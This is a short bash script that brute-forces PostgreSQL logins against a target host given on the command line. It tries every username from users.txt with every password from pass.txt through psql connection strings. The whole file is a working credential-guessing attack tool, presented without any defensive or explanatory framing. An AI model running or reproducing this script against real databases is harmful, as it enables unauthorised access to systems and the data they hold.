#!/bin/bash

if [ "$1" == "" ]
        then
                echo;echo "[>] Usage: $0 <target>";echo
        else
                for u in $(cat users.txt);do
                        for p in $(cat pass.txt);do
                                psql postgresql://$u:$p@$1
                        done
                done
fi
